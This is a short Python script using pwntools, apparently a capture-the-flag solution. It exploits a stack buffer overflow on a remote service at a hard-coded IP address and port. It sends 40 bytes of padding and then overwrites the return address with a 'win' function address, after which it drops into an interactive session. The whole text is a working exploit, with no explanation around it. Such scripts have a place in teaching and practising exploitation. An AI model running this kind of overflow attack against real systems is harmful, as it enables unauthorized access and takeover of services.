from pwn import *

r = remote("193.57.159.27", 26141)

padding = b'A'*40
win_addr = 0x401163
payload = padding + p64(win_addr)

r.sendlineafter('access: ', payload)

r.interactive()
